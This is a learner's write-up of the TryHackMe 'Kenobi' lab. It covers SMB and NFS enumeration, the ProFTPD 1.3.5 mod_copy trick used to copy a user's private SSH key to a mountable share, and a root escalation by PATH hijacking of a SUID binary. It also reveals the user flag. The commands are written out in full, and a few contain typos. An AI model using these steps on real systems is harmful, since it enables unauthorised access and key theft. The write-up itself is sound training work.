## TryHackMe - Kenobi
> Completed 3rd August  2022.

A box which walks you through enumeration of SMB shares to find attack vectors followed by new privilege escalation techniques.

---
### Environment
#### Operating System
- Latest kali-VM rolling update

#### Tools
- Nmap
- Gobuster
- Smbclient

---
### Methodology
#### Objectives/Flags
1. User flag
2. Root flag

---
#### Reconnaissance
First we run an nmap scan on our target.
```bash
nmap -T4 -sV <TargetIP>
```
```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Attempting to reach the http server through a web browser takes us to a simple page with a Star wars image. Inspecting the page reveals nothing of interest.

Out of curiosity, I ran a `Gobuster` search in the background to see if anything would be revealed. The wordlist used was `httparchive_directories_1m_2021_04_28.txt` which can be found [here](https://wordlists.assetnote.io/).
```bash
gobuster dir -u http://<Target-IP> -w <wordlist> > <Outputfile> -t 100
```
```
/server-status        (Status: 403) [Size: 277]
```
A server status page is shown in the output but when navigating to this page we get `403 Forbidden error`.

Moving on with the box we are show how to start enumerating the `SMB services` running on port `445`.
```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.93.56
```
```
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.93.56\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.93.56\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.93.56\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
```
From these results we can determine that there a 3 SMB shares found, one of which is using `kenobi` as a user. The walkthrough asks us to access the SMB share using the preinstalled `smbclient`. Commands for this client can be found [here](https://www.computerhope.com/unix/smbclien.htm). We're going to use `//server/service` format as the service name variable.
```bash
smbclient //TargetIP/anonymous
```
We are met with the request to enter the workstation's password. Using `ls` reveals a `log.txt` located in the share. we can download this using `get log.txt /home/kali/.../log.txt`. Excerpts from this file is as follows:
```
log.txt

Your identification has been saved in /home/kenobi/.ssh/id_rsa.

Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.

SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi

The key's randomart image is:
+---[RSA 2048]----+
|                 |
|           ..    |
|        . o. .   |
|       ..=o +.   |
|      . So.o++o. |
|  o ...+oo.Bo*o  |
| o o ..o.o+.@oo  |
|  . . . E .O+= . |
|     . .   oBo.  |
+----[SHA256]-----+

# Set the user and group under which the server will run.
User                            kenobi
Group                           kenobi

  # We want clients to be able to login with "anonymous" as well as "ftp"
  UserAlias                     anonymous ftp

# If you are using encrypted passwords, Samba will need to know what
# password database type you are using.  
   passdb backend = tdbsam

# Using the following line enables you to customise your configuration
# on a per machine basis. The %m gets replaced with the netbios name
# of the machine that is connecting
;   include = /home/samba/etc/smb.conf.%m
```
From this file we an gather information about the SSH key generated for the Kenobi user and configuration data for a ProFTPD server.

The walktrhough asks us to enumerate the `RPC` service running on `port 111`. 
```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <TargetIP>
```
```
PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
```
The results reveal that `/var` is a mounting point.

Next we are asked to enumerate the `FTP service` runnign on `port 21`. Based on our earlier `nmap` scan, the service is being hosted by a `ProFtpd server` at `version 1.3.5`. 

#### Weaponization 
N/A

#### Delivery
N/A

#### Exploitation
We are asked ot use a commandline search tool for [Exploit-db](https://www.exploit-db.com/).
```bash
searchsploit proftpd 1.3.5
```
```
----------------------------------------------------- ---------------------------------
 Exploit Title                                       |  Path
----------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasp | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution  | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution  | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                            | linux/remote/36742.txt
----------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
From the results we can see that the version has 4 exploit files available.
We are now instructed to get the private SSH key for the `kenobi` user by accessing the mounted `/var` directory of the ftp server.
```bash
nc TargetIP 21
  220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.226.34]
```
Once the server is access, we will be used the `mod_copy` modile using `SITE CPFR` and `SITE CPTO` (Copy-from and Copy-to which is used to copy files/directories from one place to another withing the server.
```bash
SITE CPFR /home/kenobi/.ssh/id_rsa
  350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
  250 Copy successful
```
With the private SSH key files moved to the `/var` mounting point we are instructed to mount the shared directory to hour machine.
```bash
sudo mkdir /mnt/kenobiNFS
sudo mount TargetIP:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```
```bash
cat /mnt/kenobiNFS/tmp/id_rsa
```
```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4PeD0e0522UEj7xlrLmN68R6iSG3HMK/aTI812CTtzM9gnX...
-----END RSA PRIVATE KEY-----
```


#### Installation 
N/A

#### Command & Control
N/A

#### Actions on Objective
With the private SSH key located we could attempt to remote into the `kenobi` user after we give ourselves read and write permissions on the file.
```bash
sudo chmod 600 id_rsa
sudo -i id_rsa kenobi@TargetIP
```
With this we have successfuly been able to SSH into the target machine without a password. We can start to explore for loot.
```bash
ls
cat user.txt
  d0b0f3f53b6caa532a83915e19224899
```
Next we are instructed to search the system for files in which we have permissions. At the time of this attempt, I didn't know how the command translates to SUID bits.
```bash
find / -perm -u=s -type f 2>/dev/null
```
```
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```
From here we can identify `/usr/bin/menu` as a file of interest. Running the binary presents us with some options.
```
***************************************
1. status check
2. kernel version
3. ifconfig
```
`Option 1` returns HTTP headers.
`Option 2` returns a kernal version of the host
`Option 3` returns IP addressing of the host
We are given a hint that `strings` is a linux command which looks for human readable strings from a binary.
```bash
strings /usr/bin/menu
```
The walkthrough points out that the binary is not referencing full file paths for `curl` and `uname` as shown below.
```bash
curl -I localhost
uname -r
ifconfig
```
At this point it is explained that any other binary can be coppied into the directory and renamed to curl to cause to menu binary to call on that renamed file. In this instance, they're asking for the `sh` shell be to be called. To this we clone the `sh` binary into a `curl` binary withing the `/tmp` path. Once this is done, we can max the file's permissions.
```bash
echo /bin/sh > curl
chmod 777 curl
```
From here I was a bit confused as the the command that was used however I figured we are setting a new environment path for the system to look for binaries.
```bash
export PATH=/tmp:$PATH
```
From here we can execute the `menu` binary again and when the option to curl is chosen, the shell is run as root.
```bash
/usr/bin/menu
  ** Enter your choice: 1
id
  uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```
Now we can find our final root flag.
```bash
cd /root
cat root.txt
```

---
### After-action
#### What I've learned
This box was a bit challenging as this was my first enumeration of SMB shares and file sharing servers. As much as it was a unique use case, I will try to remember these enumeration vectors going forward. I finally learnt how to find/use ssh keys as parallel move and lastly the method of privilege escalation was intriguing. The `strings` will come in handy alongside the PATH export.

#### What I would've done differently
If I was to attempt this box again, I'd like to do it without the walkthrough and gain more understanding in how the export PATH was used to change where binaries are run from.
